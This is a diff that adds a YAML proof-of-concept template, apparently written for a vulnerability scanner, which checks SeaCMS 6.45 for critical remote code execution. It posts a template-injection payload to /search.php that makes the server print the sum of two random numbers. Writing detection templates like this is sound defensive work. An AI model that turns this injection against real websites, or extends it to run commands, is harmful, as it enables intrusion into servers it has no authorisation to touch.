@@ -1,0 +1,25 @@
+id: poc-yaml-seacmsv645-command-exec
+info:
+  name: Seacmsv645 远程命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: Seacms
+  reference: []
+  description: null
+variables:
+  rand1: random_int(10000000, 80000000)
+  rand2: random_int(10000, 21000)
+transport: http
+requests:
+- method: POST
+  path: /search.php?searchtype=5
+  headers: {}
+  data: searchtype=5&order=}{end if} {if:1)print({{.rand1}}%2b{{.rand2}});if(1}{end
+    if}
+  redirect: false
+  raw: null
+  timeout: null
+  expression: contains(body, rand1 + rand2) && status_code == 200
+  output: []
